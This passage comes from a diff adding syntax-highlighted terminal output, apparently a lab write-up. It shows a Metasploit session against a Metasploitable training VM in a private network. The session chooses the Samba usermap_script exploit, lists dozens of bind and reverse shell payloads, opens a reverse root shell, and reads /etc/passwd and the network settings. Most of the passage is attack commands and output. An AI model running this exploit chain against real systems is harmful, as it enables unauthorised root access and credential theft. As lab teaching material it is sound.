+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">18&lt;/span> exploit/osx/samba/lsa_transnames_heap 2007-05-14 average No Samba lsa_io_trans_names Heap Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">19&lt;/span> exploit/solaris/samba/lsa_transnames_heap 2007-05-14 average No Samba lsa_io_trans_names Heap Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">20&lt;/span> auxiliary/dos/samba/read_nttrans_ea_list normal No Samba read_nttrans_ea_list Integer Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">21&lt;/span> exploit/freebsd/samba/trans2open 2003-04-07 great No Samba trans2open Overflow &lt;span class="o">(&lt;/span>*BSD x86&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">22&lt;/span> exploit/linux/samba/trans2open 2003-04-07 great No Samba trans2open Overflow &lt;span class="o">(&lt;/span>Linux x86&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">23&lt;/span> exploit/osx/samba/trans2open 2003-04-07 great No Samba trans2open Overflow &lt;span class="o">(&lt;/span>Mac OS X PPC&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">24&lt;/span> exploit/solaris/samba/trans2open 2003-04-07 great No Samba trans2open Overflow &lt;span class="o">(&lt;/span>Solaris SPARC&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">25&lt;/span> exploit/windows/http/sambar6_search_results 2003-06-21 normal Yes Sambar &lt;span class="m">6&lt;/span> Search Results Buffer Overflow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 25, use &lt;span class="m">25&lt;/span> or use exploit/windows/http/sambar6_search_results
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/multi/samba/usermap_script
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> No payload configured, defaulting to cmd/unix/reverse_netcat
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/samba/usermap_script&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/multi/samba/usermap_script&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">139&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>cmd/unix/reverse_netcat&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST 10.0.3.10 yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/samba/usermap_script&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOSTS 10.0.3.18
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOSTS&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.3.18
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/samba/usermap_script&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show payloads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compatible &lt;span class="nv">Payloads&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> payload/cmd/unix/adduser normal No Add user with useradd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> payload/cmd/unix/bind_awk normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via AWK&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> payload/cmd/unix/bind_busybox_telnetd normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via BusyBox telnetd&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3&lt;/span> payload/cmd/unix/bind_inetd normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>inetd&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> payload/cmd/unix/bind_jjs normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via jjs&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5&lt;/span> payload/cmd/unix/bind_lua normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Lua&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6&lt;/span> payload/cmd/unix/bind_netcat normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7&lt;/span> payload/cmd/unix/bind_netcat_gaping normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via netcat -e&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8&lt;/span> payload/cmd/unix/bind_netcat_gaping_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via netcat -e&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10&lt;/span> payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">11&lt;/span> payload/cmd/unix/bind_r normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via R&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">12&lt;/span> payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">13&lt;/span> payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">14&lt;/span> payload/cmd/unix/bind_socat_sctp normal No Unix Command Shell, Bind SCTP &lt;span class="o">(&lt;/span>via socat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">15&lt;/span> payload/cmd/unix/bind_socat_udp normal No Unix Command Shell, Bind UDP &lt;span class="o">(&lt;/span>via socat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">16&lt;/span> payload/cmd/unix/bind_zsh normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Zsh&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">17&lt;/span> payload/cmd/unix/generic normal No Unix Command, Generic Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">18&lt;/span> payload/cmd/unix/pingback_bind normal No Unix Command Shell, Pingback Bind TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">19&lt;/span> payload/cmd/unix/pingback_reverse normal No Unix Command Shell, Pingback Reverse TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">20&lt;/span> payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">21&lt;/span> payload/cmd/unix/reverse_awk normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via AWK&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">22&lt;/span> payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">23&lt;/span> payload/cmd/unix/reverse_jjs normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via jjs&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">24&lt;/span> payload/cmd/unix/reverse_ksh normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Ksh&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">25&lt;/span> payload/cmd/unix/reverse_lua normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Lua&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">26&lt;/span> payload/cmd/unix/reverse_ncat_ssl normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via ncat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">27&lt;/span> payload/cmd/unix/reverse_netcat normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via netcat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">28&lt;/span> payload/cmd/unix/reverse_netcat_gaping normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via netcat -e&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">29&lt;/span> payload/cmd/unix/reverse_openssl normal No Unix Command Shell, Double Reverse TCP SSL &lt;span class="o">(&lt;/span>openssl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">30&lt;/span> payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">31&lt;/span> payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">32&lt;/span> payload/cmd/unix/reverse_php_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via php&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">33&lt;/span> payload/cmd/unix/reverse_python normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Python&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">34&lt;/span> payload/cmd/unix/reverse_python_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via python&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">35&lt;/span> payload/cmd/unix/reverse_r normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via R&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">36&lt;/span> payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">37&lt;/span> payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">38&lt;/span> payload/cmd/unix/reverse_socat_sctp normal No Unix Command Shell, Reverse SCTP &lt;span class="o">(&lt;/span>via socat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">39&lt;/span> payload/cmd/unix/reverse_socat_tcp normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via socat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">40&lt;/span> payload/cmd/unix/reverse_socat_udp normal No Unix Command Shell, Reverse UDP &lt;span class="o">(&lt;/span>via socat&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">41&lt;/span> payload/cmd/unix/reverse_ssh normal No Unix Command Shell, Reverse TCP SSH
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">42&lt;/span> payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">43&lt;/span> payload/cmd/unix/reverse_tclsh normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Tclsh&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">44&lt;/span> payload/cmd/unix/reverse_zsh normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Zsh&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/samba/usermap_script&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/samba/usermap_script&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP double handler on 10.0.3.10:4444
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the first client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the second client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command: &lt;span class="nb">echo&lt;/span> 918Nu7uyRQCRfGBt&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket A
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from sockets...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> B: &lt;span class="s2">&amp;#34;918Nu7uyRQCRfGBt\r\n&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Matching...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> A is input...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command shell session &lt;span class="m">2&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.3.10:4444 -&amp;gt; 10.0.3.18:41566&lt;span class="o">)&lt;/span> at 2024-11-27 06:30:04 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable 2.6.24-16-server &lt;span class="c1">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /etc/passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin:x:2:2:bin:/bin:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sys:x:3:3:sys:/dev:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">games:x:5:60:games:/usr/games:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">man:x:6:12:man:/var/cache/man:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mail:x:8:8:mail:/var/mail:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">news:x:9:9:news:/var/spool/news:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxy:x:13:13:proxy:/bin:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data:x:33:33:www-data:/var/www:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">backup:x:34:34:backup:/var/backups:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gnats:x:41:41:Gnats Bug-Reporting System &lt;span class="o">(&lt;/span>admin&lt;span class="o">)&lt;/span>:/var/lib/gnats:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dhcp:x:101:102::/nonexistent:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">syslog:x:102:103::/home/syslog:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">klog:x:103:104::/home/klog:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bind:x:105:113::/var/cache/bind:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">postfix:x:106:115::/var/spool/postfix:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp:x:107:65534::/home/ftp:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">distccd:x:111:65534::/:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service:x:1002:1002:,,,:/home/service:/bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">telnetd:x:112:120::/nonexistent:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proftpd:x:113:65534::/var/run/proftpd:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">statd:x:114:65534::/var/lib/nfs:/bin/false
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ifconfig
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eth0 Link encap:Ethernet HWaddr 22:b6:2d:3a:0d:b7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet addr:10.0.3.18 Bcast:10.0.3.255 Mask:255.255.255.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet6 addr: fd45:1e06:8ea5:414a:20b6:2dff:fe3a:db7/64 Scope:Global
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet6 addr: fe80::20b6:2dff:fe3a:db7/64 Scope:Link
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX packets:3137 errors:0 dropped:0 overruns:0 frame:0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TX packets:3100 errors:0 dropped:0 overruns:0 carrier:0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> collisions:0 txqueuelen:1000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RX bytes:259575 &lt;span class="o">(&lt;/span>253.4 KB&lt;span class="o">)&lt;/span> TX bytes:398633 &lt;span class="o">(&lt;/span>389.2 KB&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Base address:0xc000 Memory:febc0000-febe0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">lo Link encap:Local Loopback
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet addr:127.0.0.1 Mask:255.0.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inet6 addr: ::1/128 Scope:Host
